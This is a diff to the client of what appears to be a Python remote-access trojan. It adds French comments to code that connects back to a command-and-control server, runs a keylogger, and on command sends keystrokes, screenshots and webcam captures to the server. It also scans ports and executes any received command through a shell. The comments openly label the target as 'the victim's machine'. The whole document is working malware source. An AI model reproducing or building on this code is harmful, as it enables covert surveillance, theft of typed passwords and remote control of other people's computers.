@@ -11,6 +11,9 @@ port_number = 1234
 keylog_file = "keylog.txt"
 
 def start_keylogger():
+    """
+    Fonction pour démarrer le keylogger
+    """
     def on_press(key):
         try:
             with open(keylog_file, "a") as f:
@@ -70,37 +73,49 @@ def send_image_to_server(cs, image_bytes):
     cs.sendall(image_bytes)
 
 def connect_to_server():
+    """
+    Fonction pour établir une connexion avec le serveur et traiter les commandes reçues.
+    """
     cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     cs.connect((ip_address, port_number))
 
+    """ Démarre le keylogger dans un thread séparé """
     threading.Thread(target=start_keylogger, daemon=True).start()
 
+    """ Boucle principale pour recevoir et exécuter les commandes """
     while True:
         try:
             command = cs.recv(1024).decode()
             if command.lower() == 'exit':
+                """ Stop le serveur C2 """
                 cs.send(b'quit')
                 break
+
             elif command.lower() == 'keylog':
+                """ Résultat du keylogger de la machine de la victime """
                 try:
                     with open(keylog_file, "r") as f:
                         keylog_content = f.read()
                     cs.send(keylog_content.encode())
                 except FileNotFoundError:
                     cs.send(b"Keylog file not found.")
+
             elif command.lower() == 'screenshot':
+                """ Capture d'écran sur la machine de la victime """
                 image_bytes = capture_screenshot()
                 if image_bytes:
                     send_image_to_server(cs, image_bytes)
                 else:
                     cs.send("Échec de la capture de l'écran.".encode('utf-8'))
             elif command.lower() == 'webcam':
+                """ Capture caméra sur la machine de la victime """
                 image_bytes = capture_webcam_image()
                 if image_bytes:
                     send_image_to_server(cs, image_bytes)
                 else:
                     cs.send("Échec de la capture de la webcam.".encode('utf-8'))
             elif command.startswith("scan"):
+                """ Scanne des ports ouverts """
                 parts = command.split()
                 if len(parts) != 3:
                     cs.send("Erreur : commande mal formée. Utilisez : scan <start_port> <end_port>".encode())
@@ -110,11 +125,14 @@ def connect_to_server():
                 output = f"Ports ouverts sur {ip_address}: {open_ports}"
                 cs.send(output.encode())
                 continue
+
             else:
+                """ Exécute toute autre commande système """
                 result = subprocess.run(command, shell=True, capture_output=True, text=True)
                 output = result.stdout + result.stderr
                 if not output:
-                    output = "Commande exécutée, pas de sortie !."
+                    output = "Commande executée, pas de sortie !."
+
                 cs.send(output.encode())
 
         except ConnectionResetError:
@@ -127,6 +145,9 @@ def connect_to_server():
     cs.close()
 
 def scan_ports(start_port, end_port):
+    """
+    Fonction pour scanner des ports dans une plage donnée et retourner ceux qui sont ouverts.
+    """
     open_ports = []
     for port in range(start_port, end_port + 1):
         try:
